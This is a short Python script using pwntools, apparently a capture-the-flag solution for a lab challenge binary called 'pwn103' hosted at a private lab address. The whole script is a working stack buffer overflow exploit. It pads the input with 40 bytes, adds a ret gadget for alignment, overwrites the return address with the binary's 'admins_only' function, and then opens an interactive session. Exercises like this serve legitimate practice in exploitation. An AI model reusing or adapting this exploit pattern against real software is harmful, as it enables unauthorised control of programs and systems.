from pwn import *

p = process("./pwn103.pwn103")
p = remote("10.10.234.36", 9003)
elf = context.binary = ELF("./pwn103.pwn103")
rop = ROP(elf)

payload = b"a"*40 + p64(rop.find_gadget(['ret'])[0]) + p64(elf.sym["admins_only"])

p.sendline("3")
p.sendline(payload)
p.sendline("\n")

p.interactive()